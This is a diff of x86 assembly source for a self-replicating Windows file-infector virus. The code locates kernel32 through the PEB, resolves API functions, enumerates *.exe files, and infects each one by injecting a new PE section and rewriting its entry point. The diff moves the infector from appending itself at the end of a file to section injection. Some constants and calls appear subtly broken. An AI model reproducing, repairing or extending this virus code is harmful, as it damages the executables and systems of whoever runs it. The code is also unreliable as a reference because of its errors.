@@ -1,18 +1,17 @@
-
 .386
 .model flat, stdcall
 option casemap:none
 
 ; ---------------- helper constant offsets ------------------
-PEB_LdrOffset      equ 12   ; PEB->Ldr   
-LDR_InInitOffset   equ 28   ; _PEB_LDR_DATA.InInitializationOrderModuleList   
-LDR_DllBaseOffset  equ 24   ; _LDR_DATA_TABLE_ENTRY.DllBase   
-LDR_BaseNameOffset equ 44   ; _LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer   
-IMAGE_DOS_e_lfanew equ 60   ; e_lfanew   
-OPTIONAL_EPT       equ 40   ; AddressOfEntryPoint inside OptionalHeader   
-WIN32_FIND_DATA_sz equ 608  ; minimal buffer for filename  
-INVALID_HANDLE     equ -1
-GEN_READ_WRITE     equ 128 or 64
+PEB_LdrOffset      equ 0Ch   ; =12 PEB->Ldr
+LDR_InInitOffset   equ 1Ch   ; =28 _PEB_LDR_DATA.InInitializationOrderModuleList
+LDR_DllBaseOffset  equ 18h   ; =24 _LDR_DATA_TABLE_ENTRY.DllBase
+LDR_BaseNameOffset equ 2Ch   ; =44 _LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer
+IMAGE_DOS_e_lfanew equ 3Ch   ; =60 e_lfanew
+OPTIONAL_EPT       equ 28h   ; =40 AddressOfEntryPoint inside OptionalHeader
+WIN32_FIND_DATA_sz equ 260h  ; =608 minimal buffer for filename
+INVALID_HANDLE     equ -1    ; Giá trị lỗi trả về từ API
+GEN_READ_WRITE     equ 80h or 40h    ;= 128 | 64
 FILE_SHARE_R       equ 1
 OPEN_EXISTING      equ 3
 FILE_END_PTR       equ 2
@@ -31,82 +30,87 @@ shell_begin label byte
 start:
     ; === 1. Locate kernel32 base ===
     xor     eax,eax
-    mov     eax,fs:[48]
+    mov     eax,fs:[30h]
     mov     eax,[eax+PEB_LdrOffset]
     mov     esi,[eax+LDR_InInitOffset]
 find_k32:
-    mov     ebx,[esi+LDR_DllBaseOffset]
-    mov     edi,[esi+LDR_BaseNameOffset]
-    mov     ax,[edi]
-    or      ax,2020h
-    cmp     ax,'k'            ; "k"
+    mov     ebx,[esi+LDR_DllBaseOffset]      ; EBX = DllBase
+    mov     edi,[esi+LDR_BaseNameOffset]     ; EDI = ptr UNICODE name
+    mov     eax,[edi]                        ; 2 wchar: 'k','e'
+    or      eax,20202020h
+    cmp     eax,0065006Bh
     jne     next_mod
-    cmp     dword ptr [edi+2],0065006Eh ; "ernel"
+    mov     eax,[edi+4]
+    or      eax,20202020h
+    cmp     eax,006E0072h
+    jne     next_mod
+    mov     ax,[edi+8]
+    or      ax,2020h
+    cmp     ax,0065h
     jne     next_mod
     jmp     got_k32
 next_mod:
-    mov     esi,[esi]         ; Flink (đầu của mỗi node có cấu trúc { Flink, Blink })
-    jmp     find_k32          ; Quay lại find_k32 để kiểm tra xem DLL kế tiếp có phải kernel32.dll không
+    mov     esi,[esi]
+    jmp     find_k32
 
 ; === 2. Resolve GetProcAddress / LoadLibraryA ===
 got_k32:
-    push    ebx               ; kernel32 base
-    call    resolve_exports   ; EAX=GetProc, EDX=LoadLib
+    push    ebx
+    call    resolve_exports
     mov     [getProcPtr], eax
     mov     [loadLibPtr], edx
 
 ; === 3. Load user32 & MessageBoxA ===
-    sub     esp,12
-    mov     dword ptr [esp],6C6C642Eh ; "dll."
-    mov     dword ptr [esp+4],32337265h; "er32"
-    mov     dword ptr [esp+8],007375h  ; "us"
+    sub     esp, 12
+    mov     dword ptr [esp], 72657375h
+    mov     dword ptr [esp+4], 642E3233h
+    mov     dword ptr [esp+8], 006C6C00h
     push    esp
-    call    edx               ; LoadLibraryA
-    add     esp,16
-    mov     ebx,eax           ; user32 base
+    call    edx
+    add     esp, 16
+    mov     ebx, eax
 
-    sub     esp,12
-    mov     dword ptr [esp],41736F4Dh ; "Mosa"
-    mov     dword ptr [esp+4],78656B73h; "skex"
-    mov     dword ptr [esp+8],00000042h; "B"
+    sub     esp, 12
+    mov     dword ptr [esp], 0073654Dh
+    mov     dword ptr [esp+4], 65676173h
+    mov     dword ptr [esp+8], 41786F42h
     push    esp
     push    ebx
-    call    eax               ; GetProcAddress
-    add     esp,16
+    call    [getProcPtr]
+    add     esp, 16
     mov     [msgBoxPtr], eax
 
 ; === 4. Calculate self size ===
     call    $+5
-    pop     esi               ; ESI = current EIP
+    pop     esi
     lea     edi, shell_end
     sub     edi, esi
     mov     [selfSize], edi
 
 ; === 5. Save host OEP ===
     mov     eax,fs:[30h]
-    mov     eax,[eax+16]
+    mov     eax,[eax+10h]
     mov     ecx,[eax+IMAGE_DOS_e_lfanew]
     mov     ecx,[eax+ecx+OPTIONAL_EPT]
     add     ecx,eax
     mov     [origOEP], ecx
 
 ; === 6. Cross‑infect *.exe ===
-    ; build "*.exe" string
     sub     esp,8
-    mov     dword ptr [esp],6578652Ah ; "*.ex"
+    mov     dword ptr [esp],6578652Ah
     mov     dword ptr [esp+4],000065
-    push    esp               ; lpFileName
+    push    esp
     sub     esp,WIN32_FIND_DATA_sz
-    mov     edi,esp           ; WIN32_FIND_DATA buffer
-    push    edi               ; lpFindFileData
+    mov     edi,esp
+    push    edi
     call    find_first
     add     esp,WIN32_FIND_DATA_sz+8
-    mov     ebx,eax           ; hFind
+    mov     ebx,eax
 
 infect_loop:
     cmp     ebx,INVALID_HANDLE
     je      infect_done
-    lea     esi,[edi+44]     ; filename
+    lea     esi,[edi+2Ch]
     push    0
     push    GEN_READ_WRITE
     push    OPEN_EXISTING
@@ -114,7 +118,7 @@ infect_loop:
     push    FILE_SHARE_R
     push    esi
     call    create_file
-    mov     ecx,eax           ; hFile
+    mov     ecx,eax
     cmp     eax,INVALID_HANDLE
     je      next_file
     sub     esp,32
@@ -124,7 +128,7 @@ infect_loop:
     push    32
     push    ecx
     call    read_file
-    mov     edx,esp           ; buffer start
+    mov     edx,esp
     mov     edi,offset markerTxt
 scan_loop:
     mov     al,[edx]
@@ -139,25 +143,93 @@ already_inf:
     push    ecx
     call    close_handle
     jmp     next_file
+
+; === Begin section injection ===
 not_infected:
-    ; move to EOF
     push    0
     push    0
-    push    FILE_END_PTR
     push    ecx
     call    set_ptr
-    ; write shellcode
+
+    sub     esp, 1024
+    lea     edi, [esp]
+    push    0
+    push    edi
+    push    1024
+    push    ecx
+    call    read_file
+
+    mov     ebx, edi
+    mov     eax, [ebx + 3Ch]
+    add     eax, ebx
+    mov     esi, eax
+    inc     word ptr [esi + 6]
+
+    mov     cx, [esi + 6]
+    dec     cx
+    mov     edx, [esi + 14h]
+    lea     edi, [esi + 18h + edx]
+    mov     eax, 0x28
+    mul     cx
+    add     edi, eax
+
+    mov     dword ptr [edi], ".inj"
+    mov     dword ptr [edi+4], "ect\0"
+
+    sub     edi, 0x28
+    mov     eax, [edi + 0Ch]
+    mov     ecx, [edi + 8]
+    add     ecx, eax
+    add     edi, 0x28
+    mov     [edi + 8], ecx
+
+    mov     eax, [selfSize]
+    mov     [edi + 0Ch], eax
+    mov     [edi + 10h], eax
+
+    sub     edi, 0x28
+    mov     eax, [edi + 14h]
+    mov     ecx, [edi + 10h]
+    add     eax, ecx
+    add     edi, 0x28
+    mov     [edi + 14h], eax
+
+    mov     [edi + 24h], 0x60000020
+
+    mov     eax, [edi + 8]
+    mov     [esi + 28h], eax
+
+    add     eax, [edi + 0Ch]
+    mov     edx, [esi + 50h]
+    add     edx, eax
+    and     edx, 0FFFFF000h
+    mov     [esi + 38h], edx
+
+    mov     eax, [edi + 14h]
+    push    0
+    push    0
+    push    eax
+    push    ecx
+    call    set_ptr
+
     push    0
     push    [selfSize]
-    push    esi               ; shell_begin address
+    push    offset shell_begin
     push    ecx
     call    write_file
-    ; write marker
+
     push    0
-    push    7
-    push    offset markerTxt
+    push    0
+    push    0
+    push    ecx
+    call    set_ptr
+
+    push    0
+    push    1024
+    push    ebx
     push    ecx
     call    write_file
+
     add     esp,32
     push    ecx
     call    close_handle
@@ -172,34 +244,35 @@ infect_done:
     call    find_close
 
 ; === 7. Payload ===
-    ; -- caption "Alert" --
     sub     esp, 8
-    mov     dword ptr [esp], 7465726Ch   ; "trel" (little‑endian for "lert")
-    mov     dword ptr [esp+4], 00000041h ; "A" + NULLs to finish "Alert"
-    lea     ebx, [esp]                   ; EBX = ptr caption
+    mov     dword ptr [esp], 72656C41h
+    mov     dword ptr [esp+4], 00000074h
+    lea     ebx, [esp]
 
-    ; -- text "You have been infected!" --
     sub     esp, 24
-    mov     dword ptr [esp],    206F7559h ; "You "
-    mov     dword ptr [esp+4],  65766168h ; "have"
-    mov     dword ptr [esp+8],  65656220h ; " bee"
-    mov     dword ptr [esp+12], 6E69206Eh ; "n in"
-    mov     dword ptr [esp+16], 74636566h ; "fect"
-    mov     dword ptr [esp+20], 00216465h ; "ed! + NULLs"
-    lea     ecx, [esp]                   ; ECX = ptr text
+    mov     dword ptr [esp],    206F7559h
+    mov     dword ptr [esp+4],  65766168h
+    mov     dword ptr [esp+8],  65656220h
+    mov     dword ptr [esp+12], 6E69206Eh
+    mov     dword ptr [esp+16], 74636566h
+    mov     dword ptr [esp+20], 00216465h
+    lea     ecx, [esp]
 
-    push    0            ; uType = MB_OK (0)
-    push    ebx          ; lpCaption = "Alert"
-    push    ecx          ; lpText    = "You have been infected!"
-    push    0            ; hWnd = NULL
+    push    0
+    push    ebx
+    push    ecx
+    push    0
     call    [msgBoxPtr]
 
-    add     esp, 32      ; clean caption(8) + text(24) bytes
+    add     esp, 48
 
 ; === 8. Return to OEP ===
     jmp     [origOEP]
 
-; ---------------- wrappers --------------------
+shell_end:
+    nop
+
+; === Helper wrappers ===
 find_first proc
     push    ebp
     mov     ebp,esp
@@ -289,4 +362,11 @@ set_ptr proc
     mov     ebp,esp
     sub     esp,12
     mov     dword ptr [esp],72507453h
-    mov     dword ptr [esp+4],72657469
+    mov     dword ptr [esp+4],72657469h
+    mov     dword ptr [esp+8],00000065h
+    push    esp
+    push    [loadLibPtr]
+    call    [getProcPtr]
+    add     esp,16
+    jmp     eax
+set_ptr endp
